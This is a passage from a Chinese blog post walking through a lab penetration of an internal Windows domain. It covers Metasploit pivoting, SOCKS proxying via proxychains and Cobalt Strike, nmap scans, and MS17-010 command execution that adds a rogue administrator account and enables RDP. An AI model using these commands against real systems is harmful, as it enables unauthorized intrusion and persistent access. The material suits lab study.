+</span></span><span class="line"><span class="cl">域控:OWA
+</span></span><span class="line"><span class="cl">域内用户三个:
+</span></span><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">ligang
+</span></span><span class="line"><span class="cl">liukaifeng01
+</span></span><span class="line"><span class="cl">域内主机三台:
+</span></span><span class="line"><span class="cl">STU1(win7) 192.168.52.143
+</span></span><span class="line"><span class="cl">OWA 192.168.52.138
+</span></span><span class="line"><span class="cl">ROOT-TVI862UBEH 192.168.52.141
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="41-使用proxychains代理">4.1 使用proxychains代理:
+</h4><p>添加内网路由 run autoroute -s 192.168.52.0/24，查看一下arp缓存表存在52网段</p>
+<p><img src="/static/img/image-20241209154407675.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209154407675"
+	
+	
+></p>
+<p>background返回一下,使用socks代理模块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf6 auxiliary(server/socks_proxy) &gt; use auxiliary/server/socks_proxy
+</span></span><span class="line"><span class="cl">msf6 auxiliary(server/socks_proxy) &gt; show options
+</span></span><span class="line"><span class="cl">msf6 auxiliary(server/socks_proxy) &gt; set VERSION 5
+</span></span><span class="line"><span class="cl">VERSION =&gt; 5
+</span></span><span class="line"><span class="cl">msf6 auxiliary(server/socks_proxy) &gt; set username admin
+</span></span><span class="line"><span class="cl">username =&gt; admin
+</span></span><span class="line"><span class="cl">msf6 auxiliary(server/socks_proxy) &gt; set password admin
+</span></span><span class="line"><span class="cl">msf6 auxiliary(server/socks_proxy) &gt; run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>重新开个终端vim /etc/proxychains.conf,如下配置</p>
+<p><img src="/static/img/image-20241209162027957.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209162027957"
+	
+	
+></p>
+<p>返回msf6,输入<code>proxychains curl http://192.168.52.143/yxcms/index.php</code>,测试可以成功访问192.168.52.0网段</p>
+<p><img src="/static/img/image-20241209162205894.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209162205894"
+	
+	
+></p>
+<h4 id="42-cs直接建立socks5代理">4.2 CS直接建立socks5代理
+</h4><p>右键点击机器-&gt;代理转发-&gt;socks代理,发现是62549端口</p>
+<p><img src="/static/img/image-20241209162347235.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209162347235"
+	
+	
+></p>
+<p>proxifier检测成功,还是这个更方便点</p>
+<p><img src="/static/img/image-20241209162500913.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209162500913"
+	
+	
+></p>
+<p>再在代理规则选择刚才那个即可</p>
+<p><img src="/static/img/image-20241209163321746.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209163321746"
+	
+	
+></p>
+<p><img src="/static/img/image-20241209163352580.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209163352580"
+	
+	
+></p>
+<h4 id="43-渗透同域主机19216852141">4.3 渗透同域主机192.168.52.141
+</h4><p><code>proxychains nmap -Pn 192.168.52.141</code></p>
+<p><img src="/static/img/image-20241209164251738.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209164251738"
+	
+	
+></p>
+<p>通过445smb端口检测操作系统为Windows server2003,<code>proxychains nmap -sV 192.168.52.141 -p 445</code></p>
+<p><img src="/static/img/image-20241209164513076.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209164513076"
+	
+	
+></p>
+<p>搜了一下2003全是永恒之蓝</p>
+<p><img src="/static/img/image-20241209165028841.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209165028841"
+	
+	
+></p>
+<p>先用第三个模块检测一下</p>
+<p><img src="/static/img/image-20241209170232546.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209170232546"
+	
+	
+></p>
+<p>直接使用msf里面的攻击模块了(ms17-010)发现接收不了session,使用msf的代理之后就不能使用反向shell了，我们需要使用正向shell。</p>
+<p><img src="/static/img/image-20241209165759224.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209165759224"
+	
+	
+></p>
+<p>换用这个代码执行试试<code>use auxiliary/admin/smb/ms17_010_command</code></p>
+<p>代码成功运行</p>
+<p><img src="/static/img/image-20241209170439287.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209170439287"
+	
+	
+></p>
+<p>接下来执行如下命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set command net user gucheng !@#123qwe!@# /add #添加用户
+</span></span><span class="line"><span class="cl">run 
+</span></span><span class="line"><span class="cl">set command net localgroup administrators gucheng /add #管理员权限
+</span></span><span class="line"><span class="cl">run 
+</span></span><span class="line"><span class="cl">set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;		#开启rdp
+</span></span><span class="line"><span class="cl">run 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用rdesktop连接<code>proxychains rdesktop 192.168.52.141</code></p>
+<p><img src="/static/img/image-20241209171859855.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209171859855"
+	
+	
+></p>
+<p>连接成功</p>
+<p><img src="/static/img/image-20241209171919145.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209171919145"
+	
+	
+></p>
+<p>msf设置正反向shell都打不通不知道为啥,登个远程桌面算了</p>
+<h4 id="44-打域控">4.4 打域控
+</h4><p>扫描端口,发现445又开启了</p>
+<p><img src="/static/img/image-20241209182152367.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209182152367"
+	
+	
+></p>
+<p>接下来执行如下命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set command net user gucheng2 !@#123qwe!@# /add #添加用户
+</span></span><span class="line"><span class="cl">run 
+</span></span><span class="line"><span class="cl">set command net localgroup administrators gucheng2 /add #管理员权限
+</span></span><span class="line"><span class="cl">run 
+</span></span><span class="line"><span class="cl">set command netsh advfirewall firewall add rule name=&#34;Remote Desktop&#34; protocol=TCP dir=in localport=3389 action=allow		#开启防火墙端口
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">set command &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;		#开启rdp
+</span></span><span class="line"><span class="cl">run 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>创建成功</p>
+<p><img src="/static/img/image-20241209180926400.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209180926400"
+	
+	
+></p>
+<p><code>proxychains rdesktop 192.168.52.138</code> 发现连接不了,端口filtered,裂开,这个msf的模块打不通不知道啥原因,以后再研究艹</p>
+<p><img src="/static/img/image-20241209183526997.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241209183526997"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 gucheNg
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.27.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
